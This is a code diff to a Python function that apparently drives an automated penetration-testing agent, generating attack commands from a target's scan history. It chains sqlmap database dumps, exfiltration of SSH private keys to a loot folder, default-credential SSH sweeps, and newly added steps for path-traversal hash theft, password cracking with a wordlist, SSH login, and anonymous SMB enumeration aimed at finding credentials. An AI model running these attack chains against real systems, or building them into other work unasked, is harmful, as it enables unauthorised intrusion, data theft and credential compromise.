@@ -116,6 +116,9 @@ def closer_commands(history: str, target: str) -> list[str]:
         _data = f" --data '{p}=1'" if meth == "POST" else ""
         cmds.append(f"sqlmap -u '{_q}' -p {p}{_data} --batch --dump --flush-session "
                     f"--level 2 --risk 1 --threads 4")
+        # LFI/path-traversal -> offline crack -> SSH: read a world-readable hash backup through the
+        # param, crack it (john+rockyou), SSH in and read the loot — all deterministic.
+        cmds.append(f"lfi-crack --url {u} --param {p} --target {target}")
         # PIVOT enabling: web foothold but no key yet -> exfiltrate likely deploy/SSH keys through it
         # (extractor auto-persists to /tmp/loot/id_rsa) and scan the /24, so a 2nd pass can ssh-loot.
         if "begin openssh private key" not in low and "/tmp/loot/id_rsa" not in low:
@@ -130,6 +133,9 @@ def closer_commands(history: str, target: str) -> list[str]:
     # Default-credential sweep when an SSH service is indicated (bounded, online-safe).
     if "22/tcp" in low or "open ssh" in low or "ssh://" in low or "port 22" in low:
         cmds.append(f"cred-sweep --target {target}")
+    # SMB: enumerate anonymous shares (best-effort breadth — files there often hold creds/configs).
+    if "445/tcp" in low or "139/tcp" in low or "microsoft-ds" in low or "netbios" in low:
+        cmds.append(f"smbclient -L //{target} -N")
     return cmds
 
 
